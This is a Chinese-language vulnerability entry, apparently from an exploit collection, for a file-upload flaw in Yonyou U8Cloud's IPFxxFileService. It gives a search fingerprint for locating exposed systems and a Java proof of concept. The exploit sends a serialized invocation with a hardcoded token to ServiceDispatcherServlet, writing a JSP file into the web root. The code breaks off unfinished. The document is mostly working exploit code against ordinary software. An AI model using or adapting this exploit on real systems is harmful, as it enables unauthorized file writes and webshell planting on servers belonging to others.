# 用友U8CloudIPFxxFileService存在文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=="U8C"`

**请求体 / payload**
```
PS：需要导入NC源码依赖,感兴趣的师傅自行研究
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetObjectOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
public class Test2 {
public static void main(String[] args) {
try {
Proxy proxy = new Proxy(Proxy.Type.HTTP,
new InetSocketAddress("127.0.0.1", 8080));
URL url = new
URL("http://your-ip:8088/ServiceDispatcherServlet");
HttpURLConnection conn = (HttpURLConnection)
url.openConnection(proxy);
conn.setRequestMethod("POST");
conn.setDoInput(true);
conn.setDoOutput(true);
conn.setRequestProperty("Content-Type", "application/x-java-serialized-object");
String content = "<%out.println(\"test\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>";
//要上传的内容
byte[] rawData = content.getBytes("UTF-8");
String path = "webapps/u8c_web/test.jsp";
InvocationInfo info = new InvocationInfo(
"",
"nc.itf.uap.pfxx.IPFxxFileService",
"writeDocToXMLFile",
new Class[]{byte[].class, String.class},
new Object[]{rawData, path}
);
info.setUserCode("root");
info.setToken("a45651e32690f6a5e2f2538f4a17d99d");
// info.setToken("199ff19e369ee96a5ab44f3945e8a4ae");
// 正确调用静态写入方法
NetObjectOutputStream.writeObject(conn.getOutputStream(), info);
// 读取响应
InputStream in = conn.getInputStream();
} catch (Exception e) {
e.printStackTrace();
```
- **预期**：200　|　—